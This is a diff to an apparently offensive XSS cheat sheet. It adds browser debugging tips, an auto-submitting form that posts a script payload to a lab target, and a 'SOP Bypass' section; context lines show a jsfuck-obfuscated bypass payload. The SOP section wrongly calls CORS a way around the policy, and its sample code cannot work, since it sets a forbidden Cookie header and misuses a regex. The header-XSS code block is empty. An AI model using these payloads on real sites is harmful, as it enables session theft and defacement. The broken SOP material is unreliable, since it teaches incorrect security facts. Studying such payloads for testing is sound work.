@@ -115,6 +115,22 @@ There are 3 main types of XSS attacks:
 To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.
 
 
+## Debug Client Side JS
+Debugging client side JS can be a pain because every-time you change the URL (including a change in the params used or param values) you need to reset the breakpoint and reload the page.
+
+### debugger;
+If you place the line debugger; inside a JS file, when the browser executes the JS it will stop the debugger in that place. Therefore, one way to set constant breakpoints would be to download all the files locally and change set breakpoints in the JS code.
+
+### Overrides
+Browser overrides allows to have a local copy of the code that is going to be executed and execute that one instead of the one from the remote server.\
+You can **access the overrides** in "Dev Tools" --> "Sources" --> "Overrides".
+
+You need to **create a local empty folder to be used to store the overrides**, so just create a new local folder and set is as override in that page.
+
+Then, in "Dev Tools" --> "Sources" **select the file** you want to override and with **right click select "Save for overrides"**.
+
+This will **copy the JS file locally** and you will be able to **modify that copy in the browser**. So just add the **`debugger;`** command wherever you want, **save** the change and **reload** the page, and every-time you access that web page **your local JS copy is going to be loaded** and your debugger command maintained in its place:
+
 ## Exploit code or POC
 
 ### Data grabber for XSS
@@ -505,6 +521,34 @@ document.getElementById('btn').onclick = function(e){
 </script>
 </html>
 ```
+
+Post data in reflect XSS.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<meta charset="UTF-8">
+</head>
+<body>
+	<form id="myform" method="post" action="http://192.168.137.247:12001/xss-labs/chall/2.php">
+		<input type="hidden" id="fname" name="fname"><br><br>
+		<input type="submit" value="submit">
+	</form>
+	<script>
+		document.getElementById("fname").value = "<script>alert(/xxss/);<\/script>";
+		document.getElementById("myform").submit();
+	</script>
+</body>
+</html>
+```
+
+Perform XSS in HTTP headers:
+```html
+
+```
+
 
 ## Blind XSS
 
@@ -1097,7 +1141,57 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 ```javascript
 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
 ```
+## SOP Bypass
+The same-origin policy（SOP） is a security policy in browsers, which restricts how documents or scripts from one origin (domain, protocol, and port) can interact with resources from another origin. The purpose of the same-origin policy is to prevent security issues such as malicious websites stealing user data or launching CSRF attacks.
 
+The same-origin policy limits the following aspects:
+
+- Restrictions on access to storage mechanisms such as cookies, localStorage, and IndexDB. Documents from different origins cannot share data in these storage mechanisms.
+
+- Restrictions on DOM operations. Documents from different origins cannot directly access each other's DOM through JavaScript, such as using `document.getElementById()` to get an element from another origin.
+
+- Restrictions on AJAX requests. Documents from different origins cannot directly access each other's resources through AJAX, such as using XMLHttpRequest to make cross-origin requests.
+
+To bypass the same-origin policy, the following methods can be used:
+
+- JSONP. By adding a callback parameter in the URL, the server returns a response containing JavaScript code, and the client calls the function in the response to obtain data.
+
+- CORS. By setting the response header on the server side, requests from other origins are allowed to access resources on the server.
+
+- Proxy. A proxy is set up on the same origin server to forward cross-origin requests to the target server and return the response to the client.
+
+It is important to note that although these methods can solve some problems caused by the same-origin policy, they may also bring security risks. For example, JSONP may be used for injecting malicious code, and CORS may be used for CSRF attacks. Therefore, it is important to use these methods with caution.
+
+
+### Bypass SOP using CORS
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    function redirectToPageWithCookie() {
+      var cookieName = "your_cookie_name";
+      var url = "https://example.com/page";
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+          var data = JSON.parse(this.responseText);
+          window.location.href = data.redirectUrl;
+        }
+      };
+      xhr.open("GET", url, true);
+      xhr.setRequestHeader("Cookie", cookieName + "=" + encodeURIComponent(document.cookie.replace(/(?:(?:^|.*;\s*) cookieName \s*\=\s*([^;]*).*$)|^.*$/, "$1")));
+      xhr.withCredentials = true;
+      xhr.send();
+    }
+  </script>
+</head>
+<body>
+  <button onclick="redirectToPageWithCookie()">跳转页面</button>
+</body>
+</html>
+```
 ## CSP Bypass
 
 Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)
